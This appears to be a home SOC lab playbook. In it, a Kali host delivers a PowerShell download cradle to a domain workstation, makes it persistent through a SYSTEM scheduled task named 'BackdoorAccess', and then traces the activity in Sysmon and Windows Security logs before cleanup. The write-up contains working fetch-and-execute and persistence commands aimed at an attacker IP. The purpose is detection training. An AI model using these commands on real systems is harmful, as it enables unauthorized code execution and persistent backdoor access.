# Active Directory Attack Playbook (PowerShell Download Cradle and Backdoor Establishment)

## Overview

- **Target:** Windows Workstation (within the soc.lab domain)

  - **IP Address:** 192.168.10.20
  - **Domain:** SOC.LAB

- **Attacker:** Kali

  - **IP Address:** 192.168.20.30

## Objective

The objective of this one is to use a PowerShell Download Cradle to deliver a malicious payload from kali to the target Windows user. This payload will simulate establishing a persistent backdoor for remote access, to then do basically what ever we want.

## Attack Execution Timeline

1. **Set Up the Malicious Payload on Kali**

   - Created a simple PowerShell payload to simulate malware activity and establish a persistent backdoor:

   ```bash
   echo 'Write-Output "Malware Simulation Active"; Start-Sleep -s 300' > /var/www/html/malicious.ps1
   sudo systemctl start apache2
   ```

   - Verified that the web server is hosting the payload:

   ```bash
   curl http://192.168.20.30/malicious.ps1
   ```



2. **Execute the PowerShell Download Cradle on Windows**

   - On the Windows Workstation (192.168.10.20), ran the following PowerShell command to download and execute the payload in memory:

   ```powershell
   powershell -exec bypass -NoProfile -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.20.30/malicious.ps1')"
   ```



3. **Establishing Persistent Access**

   - Created a scheduled task to maintain access:

   ```powershell
   $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-exec bypass -NoProfile -Command IEX(New-Object Net.WebClient).DownloadString('http://192.168.20.30/malicious.ps1')"
   $trigger = New-ScheduledTaskTrigger -AtStartup
   Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "BackdoorAccess" -User "NT AUTHORITY\SYSTEM"
   ```



## Monitoring Windows Logs

### Sysmon Logs Analysis

- **Observation:**
  - **Event ID 1**: Process Creation – Captured the execution of `powershell.exe` with the malicious download cradle.

  - **Event ID 3**: Network Connection – Logged outbound HTTP requests to `192.168.20.30` during the payload retrieval.


### Windows Security Logs

- **Event ID 4688 – Process Creation**

  - Recorded the creation of a PowerShell process executing the download cradle.

- **Event ID 4698 – Scheduled Task Creation**

  - Detected the registration of a scheduled task named `BackdoorAccess` using `powershell.exe`.



### Detailed User Log Analysis

- **User Activity:**

  - Logs show PowerShell execution under the context of `NT AUTHORITY\SYSTEM`.

  - The payload was executed immediately after the task creation event.

  - **User SYSTEM:**



- **Logoff Event:**

  - No immediate logoff event detected, indicating persistent access.

## Cleanup

1. **Remove the Backdoor Task**

   ```powershell
   Unregister-ScheduledTask -TaskName "BackdoorAccess" -Confirm:$false
   ```

2. **Stop the Apache Server on Kali**

   ```bash
   sudo systemctl stop apache2
   ```

